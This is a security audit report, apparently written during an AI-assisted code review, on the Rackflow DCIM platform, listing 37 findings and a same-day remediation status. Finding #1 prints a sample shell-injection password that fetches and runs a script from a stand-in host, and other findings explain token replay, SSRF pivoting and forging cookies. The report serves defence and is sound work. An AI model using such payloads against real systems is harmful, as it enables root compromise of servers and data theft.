# Rackflow DCIM — Full-Stack Security Audit

**Date:** 2026-07-29
**Scope:** FastAPI backend (`app/`), Svelte frontend (`frontend/`), WHMCS PHP modules (`whmcs/`), sidecar runners (`dhcp_runner/`, `tftp_runner/`, `proxy_runner/`, `ipmi_proxy_runner/`), dependencies and deployment config.
**Method:** Manual read-only trust-boundary code review across 10 parallel focus areas (auth, authz/IDOR, injection, file-serving, secrets/crypto, network/TLS/SSRF, frontend, WHMCS, runners, dependencies/config), cross-checked against `CODEBASE.md` and `tests/SECURITY_TESTS.md` claims. **No code was changed; no live/runtime exploitation was performed.** The `user-sonarqube` MCP server was not available in this session, so SonarQube findings were not cross-checked — recommend running `analyze_file_list` / a project-wide Sonar scan separately.
**Severity legend:** Critical (immediate compromise of hosts/data with low effort) · High (serious compromise, some precondition) · Medium (real risk, mitigations exist or effort required) · Low (hardening) · Informational (no action required or accepted risk).

Findings tagged **needs-runtime-validation** were identified via static review and should be confirmed against the live deployment before or while fixing.

---

## Summary table

| # | Severity | Area | Finding |
|---|---|---|---|
| 1 | **Critical** | Injection | Shell-metacharacter injection via OS-template `install.sh` parameter substitution → root RCE on bare-metal provisioning |
| 2 | **Critical** | File serving | Wildcard download tokens (`allowed_patterns=["*"]`) let a customer read any script/template file/ISO in the system |
| 3 | **Critical** | Runners | Go proxy runner is an open relay with no destination ACL, run with `network_mode: host` → SSRF/internal pivot for any proxy customer |
| 4 | **Critical** | Runners / Secrets | `ipmi_proxy_runner` fails **open** (not closed) when `IPMI_COOKIE_SECRET` is unset — forgeable IPMI/KVM session cookies |
| 5 | High | Auth | No brute-force/rate-limiting protection on login (admin or client) |
| 6 | High | File serving | `/template-files/{template_id}/{file_path}` token not bound to template — cross-template file confusion once a 2nd Windows template exists |
| 7 | Medium | Auth | Password change doesn't invalidate other sessions |
| 8 | Medium | Auth | Username-enumeration timing side channel at login (needs-runtime-validation) |
| 9 | Medium | Auth | No minimum password length/complexity, including for admin accounts |
| 10 | Medium | Auth / Network | Client IP unconditionally trusted from `X-Forwarded-For` in billing auth + impersonation (audit-log spoofing) |
| 11 | Medium | Auth | SSO redeem token passed via GET query string (log/referrer exposure) |
| 12 | Medium | Injection | Unvalidated MAC address format can be embedded in generated `dhcpd.conf` |
| 13 | Medium | File serving | TOCTOU race in `/isos/{filename}` single-use enforcement (latent, not currently reachable) |
| 14 | Medium | File serving | SPA static-file fallback uses naive `startswith()` instead of proper path containment |
| 15 | Medium | Secrets | `service_instance_encryption_key` defaults to `None`, permits silent plaintext storage |
| 16 | Medium | Secrets | BMC/IPMI and OS-install credentials stored in plaintext in DB and returned unmasked via admin API |
| 17 | Medium | Secrets / Deployment | Hardcoded default MySQL credentials in `docker-compose.yml` |
| 18 | Medium | Network | Proxmox TLS certificate verification disabled by default |
| 19 | Medium | Network | VM console WebSocket token passed via query string, exposed to access logs (2h TTL) |
| 20 | Medium | Network | Service-instance/proxy-runner config has no SSRF allowlist for `base_url` (admin-only, lower risk) |
| 21 | Medium | WHMCS | CSRF on state-changing standalone AJAX endpoints (reinstall/backup/proxy/ip/admin-link) |
| 22 | Medium | WHMCS | Stored XSS in admin Module Settings catalog preview (`.append()` instead of `.text()`) |
| 23 | Medium | Deps/Config | `/docs`, `/redoc`, `/openapi.json` exposed unauthenticated in production with no env gate |
| 24 | Low | Auth | Impersonation not persistently audit-logged |
| 25 | Low | Auth | Non-admin users can't list/revoke their own sessions (`require_admin`-gated) |
| 26 | Low | Authz | Billing-key `X-Forwarded-For` handling inconsistent (duplicate of #10, billing_auth specific) |
| 27 | Low | Authz | `impersonate_client` doesn't exclude reseller accounts (admin-only precondition) |
| 28 | Low | Runners | Non-constant-time API-key comparison in DHCP/TFTP runners and Go proxy auth store |
| 29 | Low | Runners | DHCP runner argument injection into `dhcpd` argv via `X-Runner-Interfaces` (requires existing trust) |
| 30 | Low | Runners | Go proxy `X-Bind-IP` header overrides auth/egress IP with no cross-check |
| 31 | Low | Runners | `cfgsync` in Go proxy runner doesn't enforce HTTPS for polling Rackflow config |
| 32 | Low | Deps/Config | Zero version pinning across all Python `requirements.txt` files |
| 33 | Low | Deps/Config | Containers run as root (no `USER` directive) except `proxy_runner` |
| 34 | Low | Deps/Config | Frontend build-tooling deps (`postcss`, `rollup`) have known advisories (build-time only, not shipped) |
| 35 | Low | Frontend | No global CSP for the SPA shell (defense-in-depth only — no XSS sink exists today) |
| 36 | Low | Frontend | Impersonation Bearer token stored in `sessionStorage` (JS-readable) |
| 37 | Informational | Various | Debug `console.log` of script contents, non-HTTPS `.env` secret hygiene notes, dead legacy PHP `mysql_query` fallback, GET-based ticket-minting self-CSRF, asset filename not sanitized for `Content-Disposition`, PXE endpoints authorize by MAC only, IPMI proxy forwards internal cookie upstream, `/api/servers/test` echoes exception text, `proxy_runner.env` contains a live-looking key on disk (gitignored) |

---

## Critical findings

### 1. Shell injection in OS-template `install.sh` substitution → root RCE

**Files:** `app/api/server_interaction.py:1421-1429,1472-1477`, `app/api/billing.py:607-610,3267-3270,3319-3321`; consumed at `os_templates/*/install.sh`; tainted source `whmcs/modules/servers/rackflow/rackflow.php:825-849` (`$templateParameters['admin_password']`).

Customer-controllable template parameters (e.g. `admin_password` set at WHMCS checkout/change-password) are spliced into `install.sh` as **raw text** (`script_content.replace(f"${{{var_name}}}", var_value)`), not through a shell-safe mechanism. A password containing `"; curl http://evil/x|bash; echo "` breaks out of `ADMIN_PASSWORD="${PARAM_ADMIN_PASSWORD}"` and executes as **root** in the PXE/debian-live installer environment on real bare-metal hardware, before the customer's own OS is even installed — with network reach to the provisioning/PXE/DHCP management segment.

**Fix:** Never splice untrusted values into shell-script text. Base64-encode parameter values and decode at the top of the script (`VAR=$(echo '<b64>' | base64 -d)`), or `shlex.quote()`-equivalent every substituted value (the codebase already does this correctly in `app/services/deployment/guest_config.py` — reuse that pattern). Apply uniformly across all three substitution call-sites. Add server-side validation rejecting control characters / `` ` $( ; `` in these fields as defense in depth.

### 2. Wildcard download tokens defeat file-access scoping

**Files:** `app/api/billing.py:663` and `:3305` (`allowed_patterns=["*"]`); exploitable sinks: `server_interaction.py` `/scripts/by-id/{id}` (no boot-task cross-check), `/template-files/{template_id}/{file_path}` (template_id unrelated to token), `/isos/{filename}`, `/disk-images/{filename}`.

A `fnmatch.fnmatch(filename, "*")` token minted for a customer's own routine self-service reinstall matches **any filename**. Since the customer already controls the machine running the install script (root, PXE-booted), they can extract this token trivially (`echo $DOWNLOAD_TOKEN`, `/proc/cmdline`) and replay it against unrelated endpoints to read **every custom script in the DB, every OS template's files (including other products' install scripts/answer files), and arbitrary ISOs/disk images** for the full 15-minute TTL (not consumed on most of these paths).

**Fix:** Never issue `allowed_patterns=["*"]`. Enumerate the concrete relative files an install actually needs (mirror the correct pattern already used at `server_interaction.py:1337-1349`) and pass `allowed_files` explicitly. Add a `boot_task_id` cross-check to `/scripts/by-id/{id}` matching the pattern already used correctly for installation-log uploads.

### 3. Go proxy runner: open relay + host networking → SSRF/internal pivot

**Files:** `proxy_runner/internal/proxy/http.go:67,92`, `socks5.go:93`, `splice.go:44-52`; `docker-compose.yml:127` (`network_mode: host`).

Once authenticated with their own legitimately-issued proxy credentials, a customer's `CONNECT`/SOCKS5 target host:port is dialed with **zero destination filtering** — no RFC1918/loopback/link-local denylist. Combined with `network_mode: host`, any paying HTTP/SOCKS5 proxy customer can pivot into whatever the host machine can reach: internal DCIM services (Proxmox API, MySQL, Redis, runner control ports), other tenants' infrastructure, or cloud metadata (`169.254.169.254`) if hosted on a cloud VM.

**Fix:** Add a destination-policy check in `dialTCP` (or its callers) rejecting RFC1918/loopback/link-local/ULA ranges by default (re-checked immediately before `Dial` to prevent DNS rebinding), with an explicit admin allowlist if legitimate internal targets are ever needed. Verify at the infrastructure level that the proxy-runner network segment has no route to the management plane.

### 4. `ipmi_proxy_runner` fails open when `IPMI_COOKIE_SECRET` is unset

**Files:** `ipmi_proxy_runner/main.py:44,89-92,114,467-469`; `docker-compose.yml:151` (no `:?required` guard, unlike DHCP/TFTP keys).

Unlike every other fail-closed control in this codebase (DHCP/TFTP runner API keys, `REQUIRE_SERVICE_INSTANCE_ENCRYPTION`), an unset `IPMI_COOKIE_SECRET` only logs a warning and the service **continues serving traffic**, signing session cookies with `hmac.new(b"", ...)`. Anyone can then compute `hmac_sha256(b"", f"{server_uuid}.{exp}")` themselves and forge a valid `ipmi_session` cookie for **any** server UUID, bypassing the one-time ticket flow entirely and gaining a live authenticated reverse-proxy/WebSocket session to that server's BMC/IPMI KVM console (power control, virtual media, full physical takeover). UUIDs are real v4 random, so blind guessing is infeasible, but any UUID that has ever leaked (support ticket, screenshot, log, referrer) becomes a **permanent backdoor**.

**Fix:** Refuse to start (or 503 all `/__ipmi/*` and proxy routes) when `IPMI_COOKIE_SECRET` is unset or below a minimum length; add `IPMI_COOKIE_SECRET: ${IPMI_COOKIE_SECRET:?set IPMI_COOKIE_SECRET in .env}` to both compose files, matching the DHCP/TFTP pattern. **Verify now** whether the current production deployment actually has this variable set — treat as urgent until confirmed.

---

## High findings

### 5. No brute-force/rate-limiting on login

**File:** `app/api/user.py:23-77`, reached also via `app/api/client.py:79-87`. No IP throttling, lockout, or CAPTCHA exists anywhere (confirmed repo-wide; `tests/SECURITY_TESTS.md` lists rate limiting as a future enhancement). Unlimited password guesses are possible against any account, including admin, limited only by bcrypt's per-attempt cost.

**Fix:** Add Redis-backed per-IP and per-account rate limiting on `/api/users/login` and `/api/client/login`, with temporary lockout/backoff after N failures and alerting on repeated failures against a given account.

### 6. Cross-template file confusion via unbound download token

**Files:** `app/api/server_interaction.py:1337-1349` (token minted with bare relative paths like `deploy/windows.img`), `:2190-2280` (serving endpoint takes `template_id` independently). A token minted for Template A's install can be replayed as `/template-files/{TemplateB}/deploy/windows.img?token=<A's token>` and succeeds if Template B also has that filename — **latent today** (only one Windows template exists) but will trigger the moment a second Windows-based template is added, which the current naming convention makes likely.

**Fix:** Bind the token to the resolved absolute path or `f"{template_id}/{relative_path}"`, and validate the URL's `template_id` against that binding server-side.

---

## Medium findings (grouped by area)

**Authentication (7–11):** password change doesn't revoke other sessions (`app/api/user.py:120-152`) — fix by iterating `user_toks:{id}` and deleting all `tok:*` entries on password change; possible timing-based username enumeration at login (needs-runtime-validation) — fix with a dummy constant-cost bcrypt comparison on unknown users; no minimum password length/complexity anywhere including for `is_admin=True` accounts — enforce a floor (12+ chars) in `set_password`/relevant schemas; `X-Forwarded-For` trusted unconditionally in `app/core/billing_auth.py:67-70` and `app/api/admin_users.py:336-338` unlike the rest of the codebase — gate both on `settings.trust_x_forwarded_for`; SSO redeem token passed via `GET /api/client/sso/redeem?token=...` (`app/api/client.py:311-350`) — logged in access logs/history/Referer despite being single-use — consider POST-based redeem and `Referrer-Policy: no-referrer`.

**Injection (12):** `HardwareNicEntry.mac_address` (`app/api/server_interaction.py:838-881`) has no format validation before being embedded in generated `dhcpd.conf` stanzas (`app/services/dhcp_config_generator.py:340,379-392`); low exploitability given the 17-char column cap, but add a strict MAC regex validator at the Pydantic layer as defense in depth.

**File serving (13–14):** `get_iso` (`app/api/server_interaction.py:1893-1950`) uses check-then-mark instead of the atomic `consume_token()` already used correctly by `get_disk_image` — currently unreachable since all ISO tokens are minted `single_use=False`, but one call-site change away from a real race; switch to `consume_token`. SPA static fallback (`app/main.py:341-356`) uses `str(file_path).startswith(str(static_path))` instead of `resolve()` + parents-containment used correctly everywhere else in the codebase — not exploitable in the current Docker image layout but should be brought in line with the safer pattern.

**Secrets (15–17):** `service_instance_encryption_key` defaults to `None` with `require_service_instance_encryption` defaulting to `False` (`app/core/config.py:300-304`) — any deployment path bypassing the specific `docker-compose.yml` enforcement gets silent plaintext runner-key storage; flip defaults to require encryption. BMC/IPMI credentials (`Server.plugin_config`) and OS-install credentials (`Server.credentials`) are stored in plaintext with no field-level encryption and returned **unmasked in full** via `GET /api/servers`/`GET /api/servers/{id}` (`app/api/server.py:337,346`) to any admin session — encrypt at rest (reuse the Fernet pattern from `service_instance_crypto.py`) and mask in list/detail responses. `docker-compose.yml:291-294` hardcodes `MYSQL_ROOT_PASSWORD: root` / `dcim:dcim` instead of using the `${VAR:?err}` pattern used elsewhere in the same file — drive from required env vars.

**Network (18–20):** Proxmox `verify_ssl` defaults to `False` across the plugin config template, DB column, and `ClusterCreate` schema (`app/plugins/proxmox.py:119-140`, `app/api/vm_vnc.py:363-366`) — MITM on the Proxmox management network can steal session cookies/VM console credentials undetected; flip the default to `True` and warn loudly on any cluster with it disabled. VM console WebSocket tokens (`app/api/vm_vnc.py`) are reusable for up to 2 hours and must be passed as a `?token=` query param (browser WS limitation), landing in uvicorn/proxy access logs — shorten TTL, bind to IP/UA fingerprint, and/or scrub the query param in access-log config. Service-instance/proxy-runner `base_url` fields have no SSRF allowlist (`app/api/service_instance.py`, `app/api/runner_proxy.py`) — admin-only today, but add validation against RFC1918/loopback/link-local as defense in depth.

**WHMCS (21–22):** `reinstall_action.php`, `backup_action.php`, `proxy_action.php`, `ip_action.php`, and `admin_link.php` explicitly skip `check_token()` and accept simple-request POSTs, making them reachable via cross-site auto-submitted forms using the victim's own session (customer or, for `admin_link.php`, admin) — exploitability depends on the live cookie `SameSite` configuration (**needs-runtime-validation** against `whmcs.lan.stackken.com`); add a lightweight CSRF defense (custom header check or short-lived nonce) that doesn't trigger `check_token()`'s session-teardown side effect. `hooks.php:829,840` builds HTML via string concatenation + jQuery `.append()` for catalog product spec/template names instead of `.text()` used elsewhere in the same file — stored XSS in the WHMCS admin's Module Settings tab if a RackFlow catalog product/template name ever contains markup; switch to `.text()` or proper escaping.

**Deployment (23):** `/docs`, `/redoc`, `/openapi.json` are enabled unconditionally with no environment gate in `app/main.py:138-142`, exposing the full API schema (including admin/billing/reseller endpoint shapes) to unauthenticated recon; add an `environment`/`is_production` setting to conditionally disable these paths, or restrict at the reverse-proxy layer.

---

## Low / Informational findings

- **Impersonation not durably audit-logged** (`app/api/admin_users.py:319-347`) — only recorded transiently in the Redis session hash; add a structured/DB audit log entry per impersonation mint.
- **Non-admin users can't self-manage sessions** — `GET/DELETE /api/users/sessions[/{id}]` are `require_admin`-gated despite already being scoped to the caller's own `user_id`; switch to `get_current_user`.
- **`impersonate_client` doesn't exclude reseller accounts** (`app/api/admin_users.py:319-347`) — only rejects `is_admin`; an admin-minted impersonation token for a reseller-owning user works against the full reseller-panel surface. Admin-only precondition, so low severity; reject `is_reseller` too for scope clarity.
- **Non-constant-time API key comparisons**: `dhcp_runner/main.py:104`, `tftp_runner/main.py:82` (`token != API_KEY`), and Go proxy `auth.go:62-67` (map-key lookup) — switch to `hmac.compare_digest`/`secrets.compare_digest`; entropy of the underlying secrets makes this a hardening item, not an active vuln.
- **DHCP runner argument injection via `X-Runner-Interfaces`** (`dhcp_runner/main.py:47-57,131-134,155`) — a caller with a valid runner API key (or an authenticated Rackflow admin) can smuggle extra argv elements into the `dhcpd` invocation; requires pre-existing trust. Add an interface-name allowlist regex.
- **Go proxy `X-Bind-IP` header** overrides both auth lookup and egress source IP with no cross-check against the physical connection (`proxy_runner/internal/proxy/http.go:50-52`) — doesn't grant cross-tenant access alone (password still required) but removes network topology as an independent control.
- **`cfgsync` in Go proxy runner doesn't enforce HTTPS** when polling Rackflow for proxy credentials (`proxy_runner/internal/cfgsync/sync.go:56-99`) — a MITM on a misconfigured deployment could read all customer proxy credentials or poison the config; reject non-`https://` `RACKFLOW_BASE_URL` by default.
- **Zero version pinning** across `requirements.txt`, `dhcp_runner/requirements.txt`, `tftp_runner/requirements.txt` — reproducibility/supply-chain risk; adopt `pip-compile`-generated lockfiles with hash verification.
- **Containers run as root** (no `USER` directive) in the main `Dockerfile` and `ipmi_proxy_runner/Dockerfile`; `proxy_runner`'s distroless nonroot image is the good example to follow.
- **Frontend build-tooling advisories** (`postcss`, `rollup` — 6 moderate/3 high in `npm audit` full report) are dev/build-time only, not shipped to the browser bundle; production deps report 0 vulnerabilities. Track separately, no urgency.
- **No global CSP on the SPA shell** — defense-in-depth only, since no `{@html}`/`innerHTML`/`eval` sink currently exists anywhere in `frontend/src` (verified exhaustively).
- **Impersonation Bearer token in `sessionStorage`** (`frontend/src/lib/api.js:21-46`) is the one JS-readable token in an otherwise all-httpOnly-cookie session design; acceptable given the design constraint, but a shorter TTL or one-time-exchange would shrink exposure.
- Misc informational items (no action required unless noted): debug `console.log` of full script content in `Scripts.svelte`/`api.js`; dead legacy `mysql_query()` fallback in `rackflow.php` (unreachable on PHP 7+, int-cast anyway — remove for clarity); GET-based portal/vnc/ipmi ticket-minting endpoints are only self-CSRF-able (no cross-account impact); asset `Content-Disposition` filename not sanitized (admin-upload-only); `/pxe`/`/pxe/info` authorize by MAC alone with no source-IP binding, unlike cloud-init endpoints (by PXE-necessity design — confirm reachability is restricted to PXE subnets); `ipmi_proxy_runner` forwards the internal `ipmi_session` cookie upstream to BMC firmware unfiltered; `/api/servers/test` echoes raw exception text to admins; `proxy_runner.env` contains a live-looking API key on disk but is correctly gitignored and never committed.

---

## What was verified secure (representative, not exhaustive)

- **No SQL injection anywhere in `app/dao/`** — 100% SQLAlchemy ORM/parameterized queries across all 36 DAO files.
- **Command execution is safe throughout `app/plugins/`** — IPMI password delivered via `IPMI_PASSWORD` env (never argv), all subprocess calls use list-form argv with no `shell=True`; Proxmox guest-exec and `guest_config.py` consistently use `shlex.quote()`/PowerShell-safe quoting.
- **Session tokens**: `secrets.token_urlsafe(32)` (256 bits), only SHA-256 digests stored as Redis keys, raw tokens never persisted; logout properly deletes server-side state.
- **Password hashing**: bcrypt with per-hash random salt, constant-time verification.
- **Billing/reseller API keys**: high-entropy, SHA-256-hashed at rest, plaintext shown once, constant-time comparison, no cross-namespace confusion between reseller keys and billing keys.
- **IDOR/tenant isolation**: client, reseller, and billing routers consistently use tenant-scoped DAO lookups (`get_by_id_and_reseller`, `owner_user_id` checks, `_assert_billing_owned_service`) rather than global-by-ID-then-use; confirmed against existing cross-tenant 404 tests.
- **No CORS misconfiguration** — no `CORSMiddleware` registered at all, so no `allow_origins=*` + `allow_credentials=True` footgun exists.
- **VNC/IPMI one-time tickets** are atomically single-use via Redis `HSETNX`, short-TTL, and host/service-bound.
- **Frontend has zero `{@html}`, `innerHTML`, `eval`, or `postMessage` sinks**; primary session cookie is httpOnly/SameSite=Lax/Secure, never JS-readable.
- **WHMCS module TLS verification** (`CURLOPT_SSL_VERIFYPEER`/`VERIFYHOST`) confirmed for every curl call site in both modules, not just one; all DB access via parameterized Capsule queries; all template output uses `|escape`.
- **DHCP/TFTP runners fail closed** (503) on every protected route when their API key is unset, enforced additionally at the compose level — the one exception found was `ipmi_proxy_runner` (Critical finding #4).
- **No committed secrets** — `.env`/`proxy_runner.env` never entered git history; no private keys/certs in `ipmi_certs/`; no hardcoded high-entropy secrets found via repo-wide grep.
- **No default `SECRET_KEY`/JWT signing key exists** — the app doesn't use JWTs at all, sidestepping the entire alg-confusion/default-key CVE class.

---

## Recommended remediation order

1. **Immediately verify** whether `IPMI_COOKIE_SECRET` is actually set in the production `ipmi_proxy_runner` deployment (finding #4) — if unset, this is an active, exploitable backdoor.
2. Fix the shell-injection in `install.sh` substitution (#1) and the wildcard download-token scoping (#2) — both are root-level bare-metal compromise paths reachable by ordinary customers via routine self-service actions.
3. Add a destination ACL to the Go proxy runner and review its `network_mode: host` deployment (#3).
4. Add login rate-limiting (#5) and fix the template-file token binding (#6) before a second Windows template is added.
5. Work through the Medium batch — prioritize BMC/credential encryption-at-rest (#16), Proxmox TLS default (#18), WHMCS CSRF (#21), and disabling `/docs` in production (#23) — then the Low/Informational hardening backlog.

Re-run this audit (or at minimum re-scope items #1–#6) after fixes land, and follow up with a SonarQube scan once that MCP server is available in-session.

---

## Remediation status (2026-07-29, same-day follow-up)

All findings below were addressed in this codebase in a same-day remediation pass following the audit above. `user-sonarqube` remained unavailable this session, so no post-fix Sonar scan was run — still recommended as a follow-up. Full backend (`pytest`, 753 tests), Go (`go test ./...`), and `php -l` checks all pass; the frontend build (`npm run build`) succeeds with the CSP/inline-script changes.

| # | Status | Notes |
|---|---|---|
| 1 | **Fixed** | New `app/utils/shell_escape.py` (`shell_escape_double_quoted`) applied to every `PARAM_*` substitution site in `server_interaction.py`/`billing.py`. |
| 2 | **Fixed** | `os_template_service.enumerate_relative_files` + `download_token_service.template_file_scope` replace all `allowed_patterns=["*"]` mints with explicit, template-bound `allowed_files`. |
| 3 | **Fixed** | `proxy_runner/internal/proxy/splice.go` blocks RFC1918/loopback/link-local destinations by default in `dialTCP` (re-checked post-DNS-resolution); override only via `PROXY_ALLOW_PRIVATE_DESTINATIONS` (test-only). |
| 4 | **Fixed** | `ipmi_proxy_runner/main.py` generates an ephemeral `secrets.token_urlsafe(32)` cookie secret when `IPMI_COOKIE_SECRET` is unset instead of signing with an empty key. |
| 5 | **Fixed** | Redis-backed per-IP and per-username rate limiting (`app/core/rate_limit.py`) on `/api/users/login`. |
| 6 | **Fixed** | Same fix as #2 — tokens are now bound to `template:{template_id}:{relative_path}`, so a token minted for one template can't be replayed against another. |
| 7 | **Fixed** | `change_password` now revokes all other sessions via `user_session_service.revoke_all_sessions`. |
| 8 | **Fixed** | Dummy constant-cost bcrypt comparison (`verify_password_timing_safe_dummy`) runs on the unknown-username login path. |
| 9 | **Fixed** | `User.set_password` enforces an 8-character minimum. |
| 10 | **Fixed** | `X-Forwarded-For` trust gated behind `settings.trust_x_forwarded_for` (default `False`) in `billing_auth.py` and `admin_users.py`. |
| 11 | **Mitigated, not restructured** | Left as a GET redeem (converting to POST would require a WHMCS-side auto-submit form and more invasive changes); added a global `Referrer-Policy: no-referrer` response header (see #35) so the single-use token can no longer leak via the `Referer` header on the post-redirect page. |
| 12 | **Fixed** | `HardwareNicEntry.mac_address` now has a strict regex `field_validator`. |
| 13 | **Fixed** | `get_iso` switched to the atomic `consume_token()`. |
| 14 | **Fixed** | SPA static fallback uses `Path.relative_to()` containment instead of `str().startswith()`. |
| 15 | **Fixed** | `require_service_instance_encryption` now defaults to `True`. |
| 16 | **Fixed** | New `app/services/secret_masking.py` masks `plugin_config`/`ipmi_viewer_password` in list/detail responses and transparently restores real values on update when the placeholder is submitted unchanged. |
| 17 | **Fixed** | `docker-compose.yml`/`docker-compose.registry.yml` now require `MYSQL_PASSWORD`/`MYSQL_ROOT_PASSWORD` via `${VAR:?err}`; documented in `INSTALL.md`. |
| 18 | **Fixed** | `verify_ssl` now defaults to `True` in the plugin config template, DB column, DAO, and API schema. |
| 19 | **Fixed** | `vm_vnc_session_ttl_seconds` default lowered from 7200s to 3600s; `INSTALL.md` documents scrubbing the query param from access logs. |
| 20 | **Fixed** | `ServiceInstanceCreate`/`Update.base_url` now validated to `http`/`https` schemes only. |
| 21 | **Fixed** | `rackflow_isAjaxRequest()` (X-Requested-With header check) added to `reinstall_action.php`, `backup_action.php`, `proxy_action.php`, `ip_action.php`, `admin_link.php`; all client/admin-side `fetch()` call sites updated to send the header. |
| 22 | **Fixed** | `hooks.php` catalog preview now builds spec/template list items via `$('<li/>')`/`.text()` instead of string-concatenated `.append()` HTML. |
| 23 | **Fixed** | New `settings.disable_public_api_docs` (default `True`) conditionally disables `/docs`, `/redoc`, `/openapi.json` in `app/main.py`; test suite explicitly opts back in via env var. |
| 24 | **Fixed** | Impersonation now logs a structured `admin_impersonation` line (admin id/username, target id/username, client IP) in `admin_users.py`. |
| 25 | **Fixed** | `GET/DELETE /api/users/sessions[/{id}]` switched from `require_admin` to `get_current_user`, scoped to the caller's own sessions (still 403s on cross-user delete). |
| 26 | **Fixed** | Same fix as #10. |
| 27 | **Fixed** | `impersonate_client` now also rejects `is_reseller` accounts. |
| 28 | **Fixed** | `dhcp_runner/main.py` and `tftp_runner/main.py` switched to `hmac.compare_digest`; Go proxy `auth.go` already used `subtle.ConstantTimeCompare` from the Critical/High pass. |
| 29 | **Fixed** | `dhcp_runner` now allowlists interface names (`^[A-Za-z0-9_.]{1,15}$`) before writing `runner_interfaces` or building the `dhcpd` argv, both at `PUT /config` (write time) and `_get_interfaces()` (read time). |
| 30 | **Accepted risk** | `X-Bind-IP` override left as-is — a deliberate feature for shared-listener deployments; a valid per-bind-IP password is still required, so this alone doesn't grant cross-tenant access. No code change made. |
| 31 | **Fixed** | `cfgsync/sync.go` `validateBaseURL` rejects non-`https://` `RACKFLOW_BASE_URL` except for localhost/loopback. |
| 32 | **Fixed** | `requirements.txt`, `dhcp_runner/requirements.txt`, `tftp_runner/requirements.txt` now pin exact versions matching the tested environment. |
| 33 | **Fixed (partially)** | Main `app`, `bandwidth-poller`, and `ipmi_proxy_runner` images now run as a fixed non-root `appuser` (uid/gid 10001); `app`'s entrypoint chowns the shared `/shared` volume before dropping privileges. `dhcp_runner`/`tftp_runner` intentionally remain root (privileged ports 67/69); `app-dev` intentionally remains root (bundles `isc-dhcp-server`/`tftpd-hpa` for local testing and bind-mounts host-owned source dirs). Verified via local `docker build`/`docker run` against a throwaway volume — did not touch the live `rackflow-dev` stack. |
| 34 | **No action** | Build-time-only frontend tooling advisories; unchanged per the audit's own recommendation. |
| 35 | **Fixed** | Added a global security-headers middleware in `app/main.py`: `Content-Security-Policy` (`default-src 'self'`, `script-src 'self'`, no `unsafe-inline`/`unsafe-eval`), `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`. Moved the SPA's inline theme-detection `<script>` into `frontend/public/theme-init.js` so `script-src 'self'` doesn't require `unsafe-inline`; `style-src` keeps `unsafe-inline` for Svelte's injected scoped-style `<style>` tags. |
| 36 | **No action** | Accepted per the audit's own assessment (design constraint of the impersonation flow). |
| 37 | **Partially addressed** | Removed the dead `mysql_query()`/`mysql_num_rows()`/`mysql_fetch_assoc()` last-resort branch in `rackflow_getServerConfigFromDB()` (unreachable on PHP 7+). Removed debug `console.log` of script content/responses from `frontend/src/lib/api.js` and `Scripts.svelte`, plus incidental debug logs in `ServerGroups.svelte`. Remaining informational items (self-CSRF GET tickets, `Content-Disposition` filename sanitization, PXE MAC-only auth, IPMI proxy cookie forwarding, `/api/servers/test` exception echo, gitignored `proxy_runner.env`) were left as accepted risk per the audit's own read, since none were flagged as requiring code changes.

**Not yet done:** a fresh SonarQube scan (MCP server unavailable this session) and a live-environment check that `IPMI_COOKIE_SECRET` was actually set in the production `ipmi_proxy_runner` deployment prior to this fix landing (per the original recommended remediation order, item 1) — both should be run/verified before considering this remediation pass fully closed out.
